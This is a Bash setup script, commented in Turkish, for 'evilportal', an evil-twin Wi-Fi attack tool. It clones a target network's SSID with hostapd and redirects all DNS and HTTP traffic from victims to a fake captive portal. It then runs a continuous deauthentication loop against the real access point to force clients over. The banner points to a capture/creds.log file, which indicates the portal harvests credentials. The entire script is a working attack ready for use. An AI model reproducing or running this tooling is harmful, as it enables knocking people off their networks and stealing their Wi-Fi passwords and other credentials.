#!/usr/bin/env bash
# ==============================================================
#  evilportal — evil twin + captive portal
#
#  Kullanım:
#    sudo ./setup.sh            başlat
#    sudo ./setup.sh --check    sadece ön kontrol (hiçbir şeyi değiştirmez)
#
#  Durdurmak: Ctrl+C  (temizlik otomatik yapılır)
# ==============================================================
set -uo pipefail

BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$BASE/config.sh"
source "$BASE/lib.sh"

CHECK_ONLY=0
[[ "${1:-}" == "--check" ]] && CHECK_ONLY=1

RUN="$BASE/run"
LOGS="$BASE/logs"
CAP="$BASE/capture"
mkdir -p "$RUN" "$LOGS" "$CAP"

G="\033[1;32m"; Y="\033[1;33m"; R="\033[1;31m"; D="\033[2m"; N="\033[0m"
log()  { echo -e "${G}[+]${N} $*"; }
warn() { echo -e "${Y}[!]${N} $*"; }
die()  { echo -e "${R}[-]${N} $*" >&2; exit 1; }

# ==============================================================
#  1. Ön kontroller (hiçbir şeye dokunmadan)
# ==============================================================
[[ $EUID -eq 0 ]] || die "root gerekli: sudo $0"

for b in hostapd dnsmasq iptables iw aireplay-ng python3 ipset flock; do
  command -v "$b" >/dev/null 2>&1 || \
    die "'$b' eksik — sudo apt install hostapd dnsmasq iptables iw aircrack-ng python3 ipset util-linux"
done

python3 -c 'import flask' 2>/dev/null || \
  die "flask eksik — sudo apt install python3-flask"

command -v conntrack >/dev/null 2>&1 || \
  warn "conntrack yok — doğrulama sonrası DNS ~30 sn eski hedefte kalabilir (sudo apt install conntrack)"

[[ "$GATEWAY_IP" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || \
  die "GATEWAY_IP geçersiz: '$GATEWAY_IP'"
[[ "$PORTAL_PORT" =~ ^[0-9]+$ ]] && (( PORTAL_PORT >= 1 && PORTAL_PORT <= 65535 )) || \
  die "PORTAL_PORT geçersiz: '$PORTAL_PORT'"
[[ "$AUTH_DNS_PORT" =~ ^[0-9]+$ ]] && (( AUTH_DNS_PORT >= 1 && AUTH_DNS_PORT <= 65535 )) || \
  die "AUTH_DNS_PORT geçersiz: '$AUTH_DNS_PORT'"

[[ -n "$TARGET_SSID" ]] || die "TARGET_SSID boş"
[[ "$TARGET_SSID" != *$'\n'* && "$TARGET_SSID" != *$'\r'* ]] || \
  die "TARGET_SSID satır sonu içeremez"
_ssid_bytes=$(printf '%s' "$TARGET_SSID" | wc -c)
(( _ssid_bytes <= 32 )) || \
  die "TARGET_SSID en fazla 32 bayt olabilir (şu an $_ssid_bytes bayt)"

[[ "$TARGET_BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || \
  die "TARGET_BSSID geçersiz: '$TARGET_BSSID' (AA:BB:CC:DD:EE:FF biçimi)"

[[ "$CHANNEL" =~ ^[0-9]+$ ]] || die "CHANNEL sayı olmalı: '$CHANNEL'"
(( CHANNEL >= 1 && CHANNEL <= 196 )) || die "CHANNEL aralık dışı: $CHANNEL"

if [[ -n "$WPA_PASS" ]]; then
  _len=${#WPA_PASS}
  (( _len >= 8 && _len <= 63 )) || \
    die "WPA2 parolası 8-63 karakter olmalı (şu an $_len) — hostapd reddeder"
  [[ "$WPA_PASS" != *$'\n'* && "$WPA_PASS" != *$'\r'* ]] || \
    die "WPA_PASS satır sonu içeremez"
fi

for iface in "$AP_IF" "$MON_IF"; do
  ip link show "$iface" >/dev/null 2>&1 || \
    die "arayüz yok: '$iface' — ip link ile kontrol et"
done

if [[ "$SINGLE_ADAPTER" != "1" && "$AP_IF" == "$MON_IF" ]]; then
  die "AP_IF ve MON_IF aynı ('$AP_IF') — ya ikinci adaptör ver ya SINGLE_ADAPTER=1 yap"
fi

if [[ "$SINGLE_ADAPTER" == "1" && "$AP_IF" != "$MON_IF" ]]; then
  warn "SINGLE_ADAPTER=1 ama AP_IF ($AP_IF) ≠ MON_IF ($MON_IF) — tek kart modu $AP_IF üzerinden"
fi

# port çakışması erken yakalanır
if command -v ss >/dev/null 2>&1; then
  if ss -ltnH "sport = :$PORTAL_PORT" 2>/dev/null | grep -q .; then
    die "TCP $PORTAL_PORT zaten dinleniyor — $(ss -ltnpH "sport = :$PORTAL_PORT" 2>/dev/null | head -n1)"
  fi
  if ss -ltnuH "sport = :$AUTH_DNS_PORT" 2>/dev/null | grep -q .; then
    die "port $AUTH_DNS_PORT zaten kullanımda — config.sh'de AUTH_DNS_PORT değiştir"
  fi
fi

# uplink: NetworkManager ölmüşse geri getir, yol gelene kadar bekle
ep_nm_restart
ep_wait_uplink 10 || true

if [[ -z "$UPLINK_IF" ]]; then
  UPLINK_IF=$(ip -4 route show default 2>/dev/null | \
    awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
fi
if [[ "$SHARE_INTERNET" == "1" && -z "$UPLINK_IF" ]]; then
  warn "uplink bulunamadı — internet paylaşımı kapatıldı"
  SHARE_INTERNET=0
fi
if [[ -n "$UPLINK_IF" && "$UPLINK_IF" == "$AP_IF" ]]; then
  die "uplink ($UPLINK_IF) sahte AP arayüzüyle aynı — ayrı bir uplink gerekli"
fi
if [[ -n "$UPLINK_IF" ]] && ! ip link show "$UPLINK_IF" >/dev/null 2>&1; then
  die "UPLINK_IF '$UPLINK_IF' yok — config.sh'de düzelt veya boş bırak"
fi

# rfkill ile kapatılmış kartlar sessizce çalışmaz
if command -v rfkill >/dev/null 2>&1; then
  if rfkill list wifi 2>/dev/null | grep -q "Soft blocked: yes"; then
    die "wifi rfkill ile kapatılmış — sudo rfkill unblock wifi"
  fi
  if rfkill list wifi 2>/dev/null | grep -q "Hard blocked: yes"; then
    die "wifi donanımsal olarak kapalı (Hard blocked) — fiziksel anahtarı aç"
  fi
fi

# yetkili istemciler için yerel çözümleyicinin yukarı akışı
UPSTREAM_LINES=""
while read -r ns; do
  [[ "$ns" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || continue
  [[ "$ns" == "127.0.0.1" ]] && continue
  UPSTREAM_LINES+="server=$ns"$'\n'
done < <(awk '/^nameserver[[:space:]]/{print $2}' /etc/resolv.conf 2>/dev/null)
[[ -n "$UPSTREAM_LINES" ]] || UPSTREAM_LINES=$'server=1.1.1.1\nserver=8.8.8.8\n'

# kanal modu
if (( CHANNEL > 14 )); then HW_MODE="a"; N_MODE=""
else HW_MODE="g"; N_MODE="ieee80211n=1"; fi

if [[ "$CHECK_ONLY" == "1" ]]; then
  echo
  log "ön kontrol tamam — yapılandırma geçerli"
  echo -e "  SSID      : $TARGET_SSID"
  echo -e "  BSSID     : $TARGET_BSSID"
  echo -e "  Kanal     : $CHANNEL (${HW_MODE} modu)"
  echo -e "  WPA       : ${WPA_PASS:+var}${WPA_PASS:-yok (açık)}"
  echo -e "  Monitor   : $MON_IF"
  echo -e "  AP        : $AP_IF"
  echo -e "  Uplink    : ${UPLINK_IF:-—}"
  echo -e "  Portal    : http://$GATEWAY_IP:$PORTAL_PORT/"
  echo -e "  DNS       : yetkisiz → :53 (wildcard), yetkili → :$AUTH_DNS_PORT"
  echo -e "  Yukarı    : $(printf '%s' "$UPSTREAM_LINES" | tr '\n' ' ')"
  exit 0
fi

# ==============================================================
#  2. Kilit + temizlik
# ==============================================================
LOCK="$RUN/.lock"
exec 9>"$LOCK"
flock -n 9 || die "başka bir evilportal oturumu çalışıyor ($LOCK)"

ORIG_IPFWD=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo 0)
ORIG_MON="$MON_IF"
CLEANED=0

cleanup() {
  [[ "$CLEANED" == "1" ]] && return 0
  CLEANED=1
  echo
  warn "Kapatılıyor…"

  [[ -n "${DEAUTH_PID:-}" ]] && {
    pkill -P "$DEAUTH_PID" 2>/dev/null
    kill "$DEAUTH_PID" 2>/dev/null
  }
  [[ -n "${PORTAL_PID:-}" ]] && kill "$PORTAL_PID" 2>/dev/null
  pkill -f "$BASE/portal/app.py" 2>/dev/null

  for pf in "$RUN/hostapd.pid" "$RUN/dnsmasq.pid" "$RUN/dnsmasq_auth.pid"; do
    [[ -s "$pf" ]] && kill "$(cat "$pf")" 2>/dev/null
  done
  pkill -x dnsmasq 2>/dev/null
  pkill -x hostapd 2>/dev/null

  # iptables zincirleri (başka kurallara dokunmadan)
  iptables -t nat -D PREROUTING -j EP_NAT 2>/dev/null
  iptables -t nat -F EP_NAT 2>/dev/null
  iptables -t nat -X EP_NAT 2>/dev/null
  iptables -t nat -D POSTROUTING -j EP_POST 2>/dev/null
  iptables -t nat -F EP_POST 2>/dev/null
  iptables -t nat -X EP_POST 2>/dev/null
  iptables -D FORWARD -j EP_FWD 2>/dev/null
  iptables -F EP_FWD 2>/dev/null
  iptables -X EP_FWD 2>/dev/null
  if command -v ip6tables >/dev/null 2>&1; then
    ip6tables -D FORWARD -j EP_FWD6 2>/dev/null
    ip6tables -F EP_FWD6 2>/dev/null
    ip6tables -X EP_FWD6 2>/dev/null
  fi

  ipset destroy portal_auth 2>/dev/null
  sysctl -w net.ipv4.ip_forward="$ORIG_IPFWD" >/dev/null 2>&1

  # arayüzleri geri al
  if [[ "$SINGLE_ADAPTER" == "1" ]]; then
    iw dev "$MON_VIF" del 2>/dev/null
  elif [[ "$MON_IF" != "$ORIG_MON" ]]; then
    ep_drop_vif "$MON_IF"
    ep_restore_iface "$ORIG_MON"
  else
    ep_restore_iface "$ORIG_MON"
  fi

  ip addr flush dev "$AP_IF" 2>/dev/null
  ip link set "$AP_IF" down 2>/dev/null

  ep_nm_restart
  log "Temiz."
}
trap cleanup EXIT INT TERM

# ==============================================================
#  3. Eski süreçler
# ==============================================================
log "Eski süreçler durduruluyor"
airmon-ng check kill >/dev/null 2>&1 || true
pkill -x hostapd 2>/dev/null || true
pkill -x dnsmasq 2>/dev/null || true
sleep 1

# ==============================================================
#  4. Monitor arayüzü
# ==============================================================
if [[ "$SINGLE_ADAPTER" == "1" ]]; then
  log "Tek adaptör modu — sanal monitor vif: $MON_VIF"
  iw dev "$MON_VIF" del 2>/dev/null
  ip link set "$AP_IF" down 2>/dev/null
  iw dev "$AP_IF" interface add "$MON_VIF" type monitor \
    || die "sanal monitor vif oluşturulamadı — kart tek adaptör modunu desteklemiyor"
  MON_IF="$MON_VIF"
  ip link set "$MON_IF" up || die "monitor arayüzü açılamadı: $MON_IF"
else
  if ! MON=$(ep_set_monitor "$MON_IF"); then
    die "$MON_IF monitor mode'a alınamadı — kart desteklemiyor olabilir"
  fi
  MON_IF="$MON"
  log "Monitor modu: $MON_IF"
fi

iw dev "$MON_IF" info 2>/dev/null | grep -q "type monitor" \
  || die "$MON_IF monitor mode'da değil"
iw dev "$MON_IF" set channel "$CHANNEL" \
  || die "kanal $CHANNEL ayarlanamadı (kart desteklemiyor olabilir)"
iw dev "$MON_IF" set power_save off 2>/dev/null || true

# ==============================================================
#  5. AP arayüzü
# ==============================================================
log "AP arayüzü: $AP_IF → $GATEWAY_IP/$SUBNET_MASK"
ip link set "$AP_IF" down 2>/dev/null
ip addr flush dev "$AP_IF" 2>/dev/null
ip addr add "$GATEWAY_IP/$SUBNET_MASK" dev "$AP_IF" \
  || die "IP atanamadı: $GATEWAY_IP/$SUBNET_MASK → $AP_IF"
ip link set "$AP_IF" up || die "AP arayüzü açılamadı: $AP_IF"

# ==============================================================
#  6. hostapd
# ==============================================================
cat > "$RUN/hostapd.conf" <<EOF
interface=$AP_IF
driver=nl80211
ctrl_interface=$RUN/hostapd
ssid=$TARGET_SSID
hw_mode=$HW_MODE
channel=$CHANNEL
$N_MODE
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
macaddr_acl=0
beacon_int=100
dtim_period=2
country_code=TR
ieee80211d=1
EOF

if [[ -n "$WPA_PASS" ]]; then
  cat >> "$RUN/hostapd.conf" <<EOF
wpa=2
wpa_passphrase=$WPA_PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
  log "Sahte AP: SSID=$TARGET_SSID kanal=$CHANNEL (WPA2)"
else
  log "Sahte AP: SSID=$TARGET_SSID kanal=$CHANNEL (open)"
fi

hostapd -B -P "$RUN/hostapd.pid" "$RUN/hostapd.conf" > "$LOGS/hostapd.log" 2>&1
sleep 2
if [[ ! -s "$RUN/hostapd.pid" ]] || ! kill -0 "$(cat "$RUN/hostapd.pid")" 2>/dev/null; then
  echo -e "${D}--- hostapd.log ---${N}"
  tail -n 15 "$LOGS/hostapd.log" 2>/dev/null
  die "hostapd başlatılamadı"
fi

# ==============================================================
#  7. dnsmasq — DHCP + iki çözümleyici
#     :53   → yetkisiz istemciler (her alan adı portala düşer)
#     :$AUTH_DNS_PORT → yetkili istemciler (gerçek çözümleme)
# ==============================================================
cat > "$RUN/dnsmasq.conf" <<EOF
interface=$AP_IF
bind-interfaces
listen-address=$GATEWAY_IP
dhcp-range=$DHCP_START,$DHCP_END,$DHCP_LEASE
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,1.1.1.1,8.8.8.8
address=/#/$GATEWAY_IP
no-resolv
no-hosts
log-queries
log-dhcp
dhcp-authoritative
EOF

cat > "$RUN/dnsmasq_auth.conf" <<EOF
interface=$AP_IF
bind-interfaces
listen-address=$GATEWAY_IP
port=$AUTH_DNS_PORT
no-resolv
no-hosts
cache-size=1000
$UPSTREAM_LINES
EOF

log "DHCP + wildcard DNS (:53) ve yetkili DNS (:$AUTH_DNS_PORT)"
dnsmasq -C "$RUN/dnsmasq.conf" -x "$RUN/dnsmasq.pid" > "$LOGS/dnsmasq.log" 2>&1
sleep 1
if [[ ! -s "$RUN/dnsmasq.pid" ]] || ! kill -0 "$(cat "$RUN/dnsmasq.pid")" 2>/dev/null; then
  echo -e "${D}--- dnsmasq.log ---${N}"
  tail -n 15 "$LOGS/dnsmasq.log" 2>/dev/null
  die "dnsmasq (DHCP/DNS) başlatılamadı"
fi

dnsmasq -C "$RUN/dnsmasq_auth.conf" -x "$RUN/dnsmasq_auth.pid" \
  > "$LOGS/dnsmasq_auth.log" 2>&1
sleep 1
if [[ ! -s "$RUN/dnsmasq_auth.pid" ]] || ! kill -0 "$(cat "$RUN/dnsmasq_auth.pid")" 2>/dev/null; then
  echo -e "${D}--- dnsmasq_auth.log ---${N}"
  tail -n 15 "$LOGS/dnsmasq_auth.log" 2>/dev/null
  die "dnsmasq (yetkili DNS, port $AUTH_DNS_PORT) başlatılamadı"
fi

# ==============================================================
#  8. ipset + iptables (özel zincirler)
# ==============================================================
log "iptables / ipset"
ipset create portal_auth hash:mac -exist || die "ipset oluşturulamadı"
ipset flush portal_auth

sysctl -w net.ipv4.ip_forward=1 >/dev/null

# --- nat/PREROUTING → EP_NAT
iptables -t nat -N EP_NAT 2>/dev/null || iptables -t nat -F EP_NAT
iptables -t nat -C PREROUTING -j EP_NAT 2>/dev/null || \
  iptables -t nat -I PREROUTING 1 -j EP_NAT

# DNS: yetkisiz → wildcard, yetkili → gerçek çözümleyici
for proto in udp tcp; do
  iptables -t nat -A EP_NAT -i "$AP_IF" -p "$proto" --dport 53 \
    -m set ! --match-set portal_auth src \
    -j DNAT --to-destination "$GATEWAY_IP:53" \
    || die "DNS DNAT kuralı yazılamadı ($proto/53) — xt_set modülü yüklü mü?"

  iptables -t nat -A EP_NAT -i "$AP_IF" -p "$proto" --dport 53 \
    -m set --match-set portal_auth src \
    -j DNAT --to-destination "$GATEWAY_IP:$AUTH_DNS_PORT" \
    || die "DNS DNAT kuralı yazılamadı ($proto/53 → $AUTH_DNS_PORT)"
done

# HTTP: yetkisiz → portal
iptables -t nat -A EP_NAT -i "$AP_IF" -p tcp --dport 80 \
  -m set ! --match-set portal_auth src \
  -j DNAT --to-destination "$GATEWAY_IP:$PORTAL_PORT" \
  || die "DNAT kuralı yazılamadı (tcp/80)"

# --- nat/POSTROUTING → EP_POST
if [[ "$SHARE_INTERNET" == "1" ]]; then
  iptables -t nat -N EP_POST 2>/dev/null || iptables -t nat -F EP_POST
  iptables -t nat -C POSTROUTING -j EP_POST 2>/dev/null || \
    iptables -t nat -I POSTROUTING 1 -j EP_POST
  iptables -t nat -A EP_POST -o "$UPLINK_IF" -j MASQUERADE
  log "İnternet paylaşımı: $AP_IF → $UPLINK_IF"
fi

# --- filter/FORWARD → EP_FWD
iptables -N EP_FWD 2>/dev/null || iptables -F EP_FWD
iptables -C FORWARD -j EP_FWD 2>/dev/null || iptables -I FORWARD 1 -j EP_FWD

iptables -A EP_FWD -i "$AP_IF" -p tcp --dport 443 \
  -m set ! --match-set portal_auth src \
  -j REJECT --reject-with tcp-reset
iptables -A EP_FWD -i "$AP_IF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A EP_FWD -o "$AP_IF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A EP_FWD -i "$AP_IF" -m set --match-set portal_auth src -j ACCEPT
iptables -A EP_FWD -i "$AP_IF" -j DROP

# --- IPv6 sızıntısını kapat
if command -v ip6tables >/dev/null 2>&1; then
  ip6tables -N EP_FWD6 2>/dev/null || ip6tables -F EP_FWD6
  ip6tables -C FORWARD -j EP_FWD6 2>/dev/null || ip6tables -I FORWARD 1 -j EP_FWD6
  ip6tables -A EP_FWD6 -i "$AP_IF" -j DROP
fi

# ==============================================================
#  9. portal
# ==============================================================
log "Portal: http://$GATEWAY_IP:$PORTAL_PORT/"
python3 "$BASE/portal/app.py" > "$LOGS/portal.log" 2>&1 &
PORTAL_PID=$!
sleep 2
if ! kill -0 "$PORTAL_PID" 2>/dev/null; then
  echo -e "${D}--- portal.log ---${N}"
  tail -n 15 "$LOGS/portal.log" 2>/dev/null
  die "portal başlatılamadı (port $PORTAL_PORT dolu olabilir)"
fi

# ==============================================================
#  10. deauth
# ==============================================================
log "Deauth döngüsü: $TARGET_BSSID"
"$BASE/deauth.sh" "$MON_IF" > "$LOGS/deauth.log" 2>&1 &
DEAUTH_PID=$!

echo
echo -e "${G}==============================================${N}"
echo -e "  SSID     : $TARGET_SSID"
echo -e "  Kanal    : $CHANNEL"
echo -e "  Portal   : http://$GATEWAY_IP/"
echo -e "  Kayıtlar : $CAP/creds.log"
echo -e "  İzle     : python3 $BASE/show.py -f"
echo -e "${G}==============================================${N}"
echo -e "  Durdurmak için ${Y}Ctrl+C${N}"
echo

wait "$PORTAL_PID"
